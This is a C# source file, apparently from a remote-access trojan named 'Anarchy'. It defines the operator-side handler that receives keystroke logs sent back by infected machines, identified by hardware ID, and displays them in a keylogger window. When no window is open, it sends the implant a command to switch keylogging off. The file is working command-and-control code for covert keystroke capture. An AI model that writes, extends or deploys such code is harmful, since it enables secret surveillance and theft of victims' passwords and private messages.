using System.Windows.Forms;
using Anarchy.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    internal class HandleKeylogger
    {
        public HandleKeylogger(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                FormKeylogger formKeylogger;
                formKeylogger = (FormKeylogger)Application.OpenForms["keyLogger:" + unpack_msgpack.ForcePathObject("Hwid").GetAsString()];
                if (formKeylogger != null)
                {
                    if (formKeylogger.Client == null)
                    {
                        formKeylogger.Client = client;
                        formKeylogger.timer1.Enabled = true;
                    }
                    formKeylogger.Sb.Append(unpack_msgpack.ForcePathObject("Log").GetAsString());
                    formKeylogger.richTextBox1.Text = formKeylogger.Sb.ToString();
                    formKeylogger.richTextBox1.SelectionStart = formKeylogger.richTextBox1.TextLength;
                    formKeylogger.richTextBox1.ScrollToCaret();
                }
                else
                {
                    MsgPack msgPack;
                    msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "keyLogger";
                    msgPack.ForcePathObject("isON").AsString = "false";
                    client.Send(msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }
    }
}
